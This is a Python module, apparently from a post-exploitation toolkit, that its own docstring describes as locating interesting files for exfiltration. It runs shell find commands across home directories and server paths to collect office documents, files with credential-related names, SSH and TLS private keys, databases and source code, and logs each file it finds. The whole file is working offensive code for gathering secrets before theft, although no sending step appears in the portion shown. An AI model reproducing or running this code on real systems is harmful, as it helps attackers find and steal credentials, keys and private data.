"""
Locate interesting files for exfiltration
"""

import os
from datetime import datetime
from ..core.utils import run_command


class FileFinder:
    """Find interesting files on the system"""
    
    FILE_PATTERNS = {
        'documents': ['*.doc', '*.docx', '*.pdf', '*.xls', '*.xlsx', '*.ppt', '*.pptx'],
        'credentials': ['*password*', '*credential*', '*.key', '*.pem', 'id_rsa*'],
        'keys': ['*.key', '*.pem', '*.p12', '*.pfx', '*.cer', '*.crt'],
        'databases': ['*.db', '*.sqlite', '*.sql', '*.mdb'],
        'source_code': ['*.py', '*.php', '*.java', '*.js', '*.rb', '*.go']
    }
    
    SEARCH_PATHS = [
        os.path.expanduser('~'),
        '/home',
        '/var/www',
        '/opt',
        '/srv'
    ]
    
    def find_all(self) -> dict:
        """Find all interesting files"""
        print("[*] Searching for interesting data...")
        
        interesting_files = {category: [] for category in self.FILE_PATTERNS}
        
        for category, patterns in self.FILE_PATTERNS.items():
            print(f"\n  Searching for {category}...")
            interesting_files[category] = self._find_by_patterns(patterns)
        
        return interesting_files
    
    def _find_by_patterns(self, patterns: list) -> list:
        """Find files matching patterns"""
        found_files = []
        
        for pattern in patterns:
            for search_path in self.SEARCH_PATHS:
                try:
                    command = f'find {search_path} -name "{pattern}" -type f 2>/dev/null | head -20'
                    result = run_command(command, timeout=30)
                    
                    if result:
                        files = result.strip().split('\n')
                        for file in files:
                            if file and os.path.exists(file):
                                file_info = self._get_file_info(file)
                                if file_info:
                                    found_files.append(file_info)
                                    print(f"    [+] Found: {file}")
                except:
                    pass
        
        return found_files
    
    def _get_file_info(self, file_path: str) -> dict:
        """Get file metadata"""
        try:
            return {
                'path': file_path,
                'size': os.path.getsize(file_path),
                'modified': datetime.fromtimestamp(
                    os.path.getmtime(file_path)
                ).isoformat()
            }
        except:
            return None